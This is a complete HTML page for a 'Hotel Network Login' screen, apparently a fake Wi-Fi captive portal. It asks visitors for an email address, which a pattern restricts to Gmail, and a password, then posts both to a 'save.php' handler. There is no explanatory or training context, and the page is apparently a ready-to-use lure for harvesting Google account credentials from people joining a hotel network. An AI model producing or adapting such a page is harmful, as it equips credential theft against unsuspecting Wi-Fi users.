<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Hotel Network Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: url('https://images.unsplash.com/photo-1600369671525-2913465b4a5b?auto=format&fit=crop&w=1350&q=80') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 40px 30px;
      border-radius: 10px;
      width: 90%;
      max-width: 400px;
      text-align: center;
      color: #fff;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
    }

    h2 {
      margin-bottom: 30px;
      font-size: 20px;
      letter-spacing: 1px;
      color: #ffd700;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 6px;
      font-size: 15px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #ffd700;
      color: #000;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 15px;
    }

    button:hover {
      background-color: #e5c100;
    }

    @media(max-width: 600px) {
      h2 {
        font-size: 18px;
      }

      .container {
        padding: 30px 20px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>SIGN IN/UP TO USE THE HOTEL NETWORK</h2>
    <form action="save.php" method="POST">
      <input type="email" name="email" placeholder="Email" required pattern=".+@gmail\.com">
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Connect</button>
    </form>
  </div>

</body>
</html>
